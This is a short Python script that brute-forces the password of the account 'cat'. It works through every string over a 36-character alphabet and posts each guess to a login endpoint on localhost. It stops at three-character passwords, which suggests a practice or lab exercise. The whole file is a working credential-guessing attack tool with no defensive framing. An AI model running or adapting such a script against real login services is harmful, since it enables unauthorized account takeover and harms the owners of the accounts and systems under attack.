import requests
alphabet = '0123456789qwertyuiopasdfghjklzxcvbnm'

length = 0
state = 0

base = len(alphabet)

while True:

    password = ''
    temp_state = state
    while temp_state > 0:
        ceil = temp_state // base
        rest = temp_state % base
        password = alphabet[rest] + password
        temp_state = ceil

    password = alphabet[0] * (length - len(password)) + password

    print(state, password)

    responce = requests.post('http://127.0.0.1:5000/auth', json={'login':'cat','password': password})

    if responce.status_code == 200:
        print('Success', 'cat', password)
        break

    state += 1
    if password == alphabet[-1] * length:
        length += 1
        state = 0
    if len(password) == 3:
        break
